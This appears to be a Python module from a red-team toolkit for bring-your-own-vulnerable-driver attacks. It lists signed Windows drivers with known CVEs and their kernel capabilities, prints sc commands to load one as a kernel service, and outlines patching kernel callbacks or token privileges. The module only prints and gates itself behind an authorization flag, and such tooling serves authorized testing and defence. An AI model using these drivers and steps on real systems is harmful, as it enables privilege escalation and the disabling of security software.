"""BYOVD driver loader — load vulnerable signed drivers for kernel access."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.byovd.driver_load.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kernel_driver_load", "service_creation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1068"],
}

KNOWN_VULNERABLE_DRIVERS = {
    "RTCore64": {"file": "RTCore64.sys", "vuln": "CVE-2019-16098", "cap": "read/write physical memory"},
    "DBUtil_2_3": {"file": "DBUtil_2_3.sys", "vuln": "CVE-2021-21551", "cap": "arbitrary r/w"},
    "gdrv": {"file": "gdrv.sys", "vuln": "CVE-2018-19320", "cap": "read/write physical memory"},
    "iqvw64e": {"file": "iqvw64e.sys", "vuln": "CVE-2015-2291", "cap": "arbitrary code execution"},
    "aswarpot": {"file": "aswArPot.sys", "vuln": "Avast driver", "cap": "kill processes"},
    "procexp": {"file": "PROCEXP152.sys", "vuln": "SysinternalsSuite", "cap": "kill processes"},
}


def run(args: Any) -> int:
    driver = getattr(args, "driver", None)
    driver_path = getattr(args, "driver_path", None)
    action = getattr(args, "byovd_action", "list")

    if action == "list":
        print("[*] Known vulnerable drivers:")
        for name, info in KNOWN_VULNERABLE_DRIVERS.items():
            print("  {} ({}) — {} [{}]".format(
                name, info["file"], info["cap"], info["vuln"]))
        return 0

    if action == "load":
        if not driver_path:
            print("[!] --driver-path required", file=sys.stderr)
            return 1

        svc_name = driver or "VulnDrv"
        print(f"[*] Loading driver: {driver_path} as service {svc_name}")
        print(f"  sc create {svc_name} type=kernel binPath={driver_path}")
        print(f"  sc start {svc_name}")
        print("\n[!] Requires local admin")
        return 0

    if action == "exploit":
        if not driver:
            print("[!] --driver required (name from list)", file=sys.stderr)
            return 1
        info = KNOWN_VULNERABLE_DRIVERS.get(driver, {})
        print("[*] BYOVD exploit: {} ({})".format(driver, info.get("vuln", "unknown")))
        print("  Capability: {}".format(info.get("cap", "unknown")))
        print("  1. Load driver via sc create/start")
        print("  2. Use IOCTL to access kernel memory")
        print("  3. Patch kernel callbacks / token privileges")
        return 0

    return 1
